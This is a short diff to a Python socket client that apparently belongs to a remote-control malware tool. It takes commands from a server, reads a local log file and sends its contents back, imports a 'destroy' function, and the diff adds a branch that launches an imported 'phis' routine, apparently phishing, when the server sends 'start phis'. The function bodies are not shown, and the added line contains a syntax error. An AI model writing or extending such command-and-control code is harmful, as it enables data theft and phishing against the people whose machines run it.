@@ -1,6 +1,6 @@
 
 import socket
-from main import get_ip,destroy,log
+from main import get_ip,destroy,log,phis
 
 HEADER = 64
 port = 5050
@@ -31,3 +31,5 @@ while True:
         f = open("programm/log.txt")
         r  =f.readlines()
         send(r)
+    elif client.recv(HEADER).decode("utf-8")=="start phis"):
+        phis()
